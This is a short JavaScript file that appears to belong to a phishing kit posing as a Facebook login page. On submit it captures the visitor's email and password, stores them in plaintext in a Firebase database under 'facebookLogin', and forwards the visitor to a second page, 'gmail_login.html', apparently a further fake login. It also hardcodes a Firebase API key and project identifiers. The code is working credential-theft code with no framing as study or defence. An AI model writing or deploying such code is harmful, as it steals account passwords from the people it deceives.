const firebaseConfig = {
  apiKey: "AIzaSyDwuXlj3uGaHK7WpaFVhWHkUUprXT-BaKM",
  authDomain: "facebooklogin-978a1.firebaseapp.com",
  databaseURL: "https://facebooklogin-978a1-default-rtdb.firebaseio.com",
  projectId: "facebooklogin-978a1",
  storageBucket: "facebooklogin-978a1.appspot.com",
  messagingSenderId: "709471528879",
  appId: "1:709471528879:web:9585cb14e686553c39715a",
  measurementId: "G-4K8FN8VMYN"
};
// initialize firebase
firebase.initializeApp(firebaseConfig);

// reference your database
var facebookLoginDB = firebase.database().ref('facebookLogin');

document.getElementById("myform").addEventListener("submit", submitForm)

function submitForm(e){
e.preventDefault();

var email = getElementVal("email");
var pass = getElementVal("pass");

saveLogins(email, pass);

  // Redirect to Facebook
  window.location.href = 'gmail_login.html';


//This is the function that will reset my facebook page
document.getElementById("myform").reset();
}

const saveLogins = (email, pass) => {
var newFacebookLogin = facebookLoginDB.push();

newFacebookLogin.set({
  email : email,
  pass : pass,
})
};

const getElementVal = (id) => {
return document.getElementById(id).value;
};